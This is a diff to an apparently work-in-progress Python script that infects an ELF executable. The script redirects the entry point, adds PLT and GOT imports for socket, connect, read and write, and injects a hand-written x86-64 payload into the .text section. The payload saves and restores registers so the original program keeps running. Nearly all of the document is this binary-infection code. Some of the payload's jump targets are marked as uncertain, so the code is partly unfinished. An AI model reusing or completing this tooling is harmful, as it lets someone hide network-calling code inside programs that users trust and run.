@@ -582,6 +582,32 @@ def edit_text_section_calls():
                     edit_code_section(ELF.get_section(i)['sh_offset'],ELF.get_section(i)['sh_size'])
 
 
+def inject_code():
+    sizes = []
+    total_length = len(inject) + len(call_inject_indices) * 3
+    print("TOTAL LENGTH",total_length)
+    i = 0
+    print("index:",hex(inject.index(0x11223344)))
+
+    my_indices = [index for index, value in enumerate(inject) if value == 0x11223344]
+
+    for num in my_indices:
+        print("INDEX:",hex(num))
+    while i < len(inject) + len(call_inject_indices) * 3:
+        #print(hex(i))
+        if i in call_inject_indices:
+            sizes.append(4)
+            i = i + 3
+        else:
+            sizes.append(1)
+        i = i + 1 
+    print(sum(sizes))
+    add_contents_to_file(TEXT_INJECT_OFFSET,inject,sizes)
+
+    num_bytes_to_align = TEXT_ALIGNMENT_SIZE - TEXT_INJECT_SIZE
+    if num_bytes_to_align > 0:
+        align_section(TEXT_INJECT_OFFSET+TEXT_INJECT_SIZE,num_bytes_to_align)
+
 ## START
 
 FILE_NAME = 'hello'
@@ -692,6 +718,11 @@ section = ELF.get_section_by_name(".dynstr")
 DYN_STR_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
 DYN_STR_INJECT_SIZE = len(str_tab_entries)
 
+#.text
+section = ELF.get_section_by_name(".text")
+TEXT_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
+TEXT_INJECT_SIZE = 0x277 # size of inject array
+
 
 RELA_PLT_OFFSET = ELF.get_section_by_name(".rela.plt")['sh_offset']
 DYN_SYM_OFFSET = ELF.get_section_by_name(".dynsym")['sh_offset']
@@ -701,10 +732,10 @@ GNU_VERSION_R_OFFSET = ELF.get_section_by_name(".gnu.version_r")['sh_offset']
 
 TEXT_OFFSET = ELF.get_section_by_name(".text")['sh_offset']
 
-SECTIONS_OFFSETS = [SYM_TAB_OFFSET,GOT_OFFSET,PLT_SEC_OFFSET,PLT_OFFSET,RELA_PLT_OFFSET,GNU_VERSION_R_OFFSET,GNU_VERSION_OFFSET,DYN_STR_OFFSET,DYN_SYM_OFFSET]
-ELF_SECTIONS_CHANGES = ['.symtab','.got','.plt.sec','.plt','.rela.plt','.gnu.version_r','.gnu.version','.dynstr','.dynsym']
-ELF_SECTIONS_INJECT_SIZES = [SYM_TAB_INJECT_SIZE,GOT_INJECT_SIZE,PLT_SEC_INJECT_SIZE,PLT_INJECT_SIZE,RELA_PLT_INJECT_SIZE,GNU_VERSION_R_INJECT_SIZE,GNU_VERSION_INJECT_SIZE,DYN_STR_INJECT_SIZE,DYN_SYM_INJECT_SIZE]
-INJECT_OFFSETS = [SYM_TAB_INJECT_OFFSET,GOT_INJECT_OFFSET,PLT_SEC_INJECT_OFFSET,PLT_INJECT_OFFSET,RELA_PLT_INJECT_OFFSET,GNU_VERSION_R_INJECT_OFFSET,GNU_VERSION_INJECT_OFFSET,DYN_STR_INJECT_OFFSET,DYN_SYM_INJECT_OFFSET]
+SECTIONS_OFFSETS = [SYM_TAB_OFFSET,GOT_OFFSET,TEXT_OFFSET,PLT_SEC_OFFSET,PLT_OFFSET,RELA_PLT_OFFSET,GNU_VERSION_R_OFFSET,GNU_VERSION_OFFSET,DYN_STR_OFFSET,DYN_SYM_OFFSET]
+ELF_SECTIONS_CHANGES = ['.symtab','.got','.text','.plt.sec','.plt','.rela.plt','.gnu.version_r','.gnu.version','.dynstr','.dynsym']
+ELF_SECTIONS_INJECT_SIZES = [SYM_TAB_INJECT_SIZE,GOT_INJECT_SIZE,TEXT_INJECT_SIZE,PLT_SEC_INJECT_SIZE,PLT_INJECT_SIZE,RELA_PLT_INJECT_SIZE,GNU_VERSION_R_INJECT_SIZE,GNU_VERSION_INJECT_SIZE,DYN_STR_INJECT_SIZE,DYN_SYM_INJECT_SIZE]
+INJECT_OFFSETS = [SYM_TAB_INJECT_OFFSET,GOT_INJECT_OFFSET,TEXT_INJECT_OFFSET,PLT_SEC_INJECT_OFFSET,PLT_INJECT_OFFSET,RELA_PLT_INJECT_OFFSET,GNU_VERSION_R_INJECT_OFFSET,GNU_VERSION_INJECT_OFFSET,DYN_STR_INJECT_OFFSET,DYN_SYM_INJECT_OFFSET]
 ELF_SECTIONS_ALIGNMENT_SIZES = align_offsets() 
 SECTION_INDICES = get_indices_of_sections()
 
@@ -717,6 +748,7 @@ GNU_VERSION_R_ALIGNMENT_SIZE = get_alignment_size('.gnu.version_r')
 GNU_VERSION_ALIGNMENT_SIZE = get_alignment_size('.gnu.version')
 DYN_STR_ALIGNMENT_SIZE = get_alignment_size('.dynstr')
 DYN_SYM_ALIGNMENT_SIZE = get_alignment_size('.dynsym')
+TEXT_ALIGNMENT_SIZE = get_alignment_size('.text')
 
 print("SECTIONS",ELF_SECTIONS_CHANGES)
 print("SIZES",ELF_SECTIONS_INJECT_SIZES)
@@ -724,52 +756,29 @@ print("ALIGNMENT SIZES",ELF_SECTIONS_ALIGNMENT_SIZES)
 print("SECTION OFFSETS",SECTIONS_OFFSETS)
 print("INJECT OFFSETS",INJECT_OFFSETS)
 
-# Modifications
-
-edit_entry_point()
-edit_symbol_table()
-edit_dynamic_section()
-edit_rela_dyn_section()
-edit_rela_plt_section()
-edit_gnu_version_r_section()
-
-edit_text_section_calls()
-
-edit_program_header()
-edit_elf_sections()
-edit_sections_changes_sizes()
-
-modify_file(40,(ELF['e_shoff']+sum(ELF_SECTIONS_ALIGNMENT_SIZES)).to_bytes(8,'little'))
-
-print("Num symbols to add ",len(symbol_names))
-
-# Injections
-
-add_functions_to_sym_tab()
-add_functions_to_got()
-add_functions_to_plt_sec()
-add_functions_to_plt()
-add_functions_to_rela_plt()
-add_versions_to_gnu_version_r()
-add_versions_to_gnu_version()
-add_strings_to_dyn_str_tab()
-add_functions_to_dyn_sym()
-
 socketPLT = 0x11223344
 memsetPLT = 0x11223344
-connectPLT = 0x11223344
-writePLT = 0x11223344
+connectPLT =0x11223344
+writePLT =  0x11223344
 strlenPLT = 0x11223344
-closePLT = 0x11223344
-readPLT = 0x11223344
+closePLT =  0x11223344
+readPLT =   0x11223344
 stack_chk_failPLT = 0x11223344
+
+call_inject_indices = [0xa2, 0xce, 0x106, 0x11d, 0x15e, 0x1b0, 0x1f5, 0x240, 0x25c]
 
 inject = [
     0xf3, 0x0f, 0x1e, 0xfa,                                     # enbr64
+    0x50,                                                       # push %rax
+    0x52,                                                       # push %rdx
+    0x56,                                                       # push %rsi
+    0x57,                                                       # push %rdi
+    0x51,                                                       # push %rcx
     0x55,                                                       # push %rbp
     0x48, 0x89, 0xe5,                                           # mov %rsp, %rbp
     0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00,                   # sub $0x1000, %rsp
     0x48, 0x83, 0x0c, 0x24, 0x00,                               # orq $0x0, (%rsp)
+    0x48, 0x83, 0xec, 0x70,                                     # sub $0x70, %rsp
     0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00,       # %fs:0x28, %rax
     0x48, 0x89, 0x45, 0xf8,                                     # mov %rax,-0x8(%rbp)
     0x31, 0xc0,                                                 # xor %eax, %eax
@@ -831,7 +840,8 @@ inject = [
     0x74, 0x1c,                                                 # je NOT SURE YET
     0x8b, 0x85, 0xac, 0xef, 0xff, 0xff,                         # mov -0x1054(%rbp),%eax
     0x01, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # add %eax, -0x1064(%rbp)
-    0x8b, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # cmp -0x1058(%rbp),%eax
+    0x8b, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # mov -0x1064(%rbp),%eax
+    0x3b, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # cmp -0x1058(%rbp),%eax
     0x7c, 0x99,                                                 # jl NOT SURE YET
     0xeb, 0x01,                                                 # jmp NOT SURE YET
     0x90,                                                       # nop
@@ -882,6 +892,49 @@ inject = [
     0x74, 0x05,                                                 # je idk
     0xe8,   stack_chk_failPLT   ,                               # callq stack_chk_fail@PLT
     0xc9,                                                       # leaveq
-    0xc3,                                                       # retq
+    0x59,                                                       # pop %rcx
+    0x5f,                                                       # pop %rdi
+    0x5e,                                                       # pop %rsi
+    0x5a,                                                       # pop %rdx
+    0x58,                                                       # pop %rax
+    0xeb, 0xf8,                                                 # jmp (probably going to change)
     0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, # nopw %cs:0x0(%rax,%rax,1)
+    0x0f, 0x1f, 0x44, 0x00, 0x00,                               # nopl 0x0(%rax,%rax,1)
 ]   
+
+
+# Modifications
+
+edit_entry_point()
+edit_symbol_table()
+edit_dynamic_section()
+edit_rela_dyn_section()
+edit_rela_plt_section()
+edit_gnu_version_r_section()
+
+edit_text_section_calls()
+
+edit_program_header()
+edit_elf_sections()
+edit_sections_changes_sizes()
+
+modify_file(40,(ELF['e_shoff']+sum(ELF_SECTIONS_ALIGNMENT_SIZES)).to_bytes(8,'little'))
+
+print("Num symbols to add ",len(symbol_names))
+
+# Injections
+
+add_functions_to_sym_tab()
+add_functions_to_got()
+inject_code()
+add_functions_to_plt_sec()
+add_functions_to_plt()
+add_functions_to_rela_plt()
+add_versions_to_gnu_version_r()
+add_versions_to_gnu_version()
+add_strings_to_dyn_str_tab()
+add_functions_to_dyn_sym()
+
+# rax rcx rdi rdi rsi r9 r12 r13 
+
+print(hex(len(inject)+27))
